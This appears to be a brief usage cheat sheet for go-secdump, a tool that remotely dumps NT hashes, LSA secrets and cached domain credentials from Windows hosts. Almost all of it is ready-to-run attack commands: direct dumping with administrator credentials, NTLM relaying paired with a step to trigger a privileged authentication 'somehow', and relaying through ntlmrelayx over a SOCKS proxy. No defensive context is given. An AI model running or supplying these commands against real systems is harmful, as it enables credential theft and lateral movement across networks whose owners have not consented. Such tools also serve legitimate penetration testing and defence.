# Go-secdump

## Github repo: https://github.com/jfjallid/go-secdump

## Dump NT Hashes from SAM, LSA Secrets and Domain Cached Credentials remotely

## Requirements: Read permissions on SAM and SECURITY hives (usually only NT AUTHORITY\SYSTEM has these permissions) and/or local group administrators have WriteDACL on the registry hives.

### Usage:

    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local

### or

    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2

    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam (Dump only SAM)

    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa (Dump only LSA)

    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2 (Dump only DCC2 cache secrets)

# Dump secrets via NTLM Relaying

#### 1) 

    ./go-secdump --host 192.168.0.100 -n --relay (Dump registry secrets using NTLM relaying)

### then

#### 2) Trigger an authentication with administrative access to 192.168.0.100 somehow, then wait for the dumped secrets

# Dump secrets via SOCKS Proxy

#### 1) 

    ./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server

#### 2) 

    ./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080

